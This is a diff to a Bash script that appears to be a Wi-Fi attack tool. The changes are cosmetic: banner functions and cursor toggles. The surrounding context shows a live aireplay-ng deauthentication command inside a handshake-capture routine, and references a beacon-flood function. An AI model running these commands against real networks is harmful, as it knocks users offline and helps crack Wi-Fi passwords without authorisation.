@@ -191,7 +191,7 @@ handshake_ataque() {
 	tput civis
 	$cleancolor; kill -9 $xtermnet; wait $xtermnet 2>/dev/null
 	echo -e "${greenColour}[!]$grayColour If you choose no, a global deauthentication will be performed on the network"
-	echo -ne "${greenColour}[?]$grayColour Do you want to add a MAC address for deauthentication?  [Y/N]: " && read macoption
+	tput cnorm; echo -ne "${greenColour}[?]$grayColour Do you want to add a MAC address for deauthentication?  [Y/N]: " && read macoption
 	if [ "$macoption" == "Y" ] || [ "$macoption" == "y" ]; then
 		echo -ne "\n${blueColour}[?]$grayColour MAC: " && read macdes
 		echo -e "${greenColour}[*]$grayColour $macdes is deauthenticating"
@@ -200,7 +200,7 @@ handshake_ataque() {
 		sleep 2; xterm -hold -e "aireplay-ng -0 10 -e $ap -c $macdes $tar" &
 		aireplay_xtermMAC_PID=$!
 		sleep 10; kill -9 $aireplay_xtermMAC_PID; wait $aireplay_xtermMAC_PID 2>/dev/null
-		echo -e "${redColour}\n[%]$grayColour Waiting for Handshake\n"
+		tput civis; echo -e "${redColour}\n[%]$grayColour Waiting for Handshake\n"
 		$cleancolor
 		sleep 10; kill -9 $airodump_filter_xtermMAC_PID
 		wait $airodump_filter_xtermMAC_PID 2>/dev/null
@@ -505,6 +505,24 @@ beaconflood() {
 	fi
 	
 }
+bannerattack() {
+	echo -e "	    .--======."
+	echo -e "     :   .-@#*==-!==+#@*-."
+	echo -e "     I__________%@%%#*-.___"
+	echo -e "O====I__________#%%#*-._____>"
+	echo -e "     I    .-*=:::::--."
+	echo -e "     :      .-####-."
+	echo -e "	      .*_"
+	echo -e "               ."
+}
+banner() {
+	echo "  _       __  _   ____  _      ____                               __      __ "
+	echo " | |     / / (_) / __/ (_)    / __ \ _      __  ____   ___   ____/ / ____/ / "
+	echo " | | /| / / / / / /_  / /    / /_/ /| | /| / / / __ \ / _ \ / __  / / __  /   "
+	echo " | |/ |/ / / / / __/ / /    / ____/ | |/ |/ / / / / //  __// /_/ / / /_/ /  "
+	echo " |__/|__/ /_/ /_/   /_/    /_/      |__/|__/ /_/ /_/ \___/ \__,_/  \__,_/  "
+}
+
 
 # Comprobacion si el usuario es root
 if [ $(id -u) -ne 0 ]; then
@@ -516,11 +534,7 @@ else
 	updatepackages
 	tput civis; clear
 	echo -e "${turquoiseColour}"
-	echo "  _       __  _   ____  _      ____                               __      __ "
-	echo " | |     / / (_) / __/ (_)    / __ \ _      __  ____   ___   ____/ / ____/ / "
-	echo " | | /| / / / / / /_  / /    / /_/ /| | /| / / / __ \ / _ \ / __  / / __  /   "
-	echo " | |/ |/ / / / / __/ / /    / ____/ | |/ |/ / / / / //  __// /_/ / / /_/ /  "
-	echo " |__/|__/ /_/ /_/   /_/    /_/      |__/|__/ /_/ /_/ \___/ \__,_/  \__,_/  "  
+	banner
 	echo -e "\n${greenColour}[+]${grayColour} Github: https://github.com/kidd3n"
 	echo -ne "${greenColour}[+]$grayColour Enter to continue" && read 
 	$cleancolor
@@ -545,14 +559,7 @@ else
 				clear
 				echo -e "${purpleColour}\n[+]$grayColour Attack Menu\n${endColour}"
 				echo -e "${redColour}"
-				echo -e "	     .--======."
-				echo -e "     :   .-@#*==-!==+#@*-."
-				echo -e "     I__________%@%%#*-.___"
-				echo -e "O====I__________#%%#*-._____>"
-				echo -e "     I    .-*=:::::--."
-				echo -e "     :      .-####-."
-				echo -e "	      .*_"
-				echo -e "               ."
+				bannerattack
 				sleep 0.5
 				echo -e "${greenColour}\n[+]${grayColour} Network card: $tar"
 				echo -e "${greenColour}[+]${grayColour} MAC: $(macchanger -s $tar | grep -i current | xargs | cut -d ' ' -f '3-100')"
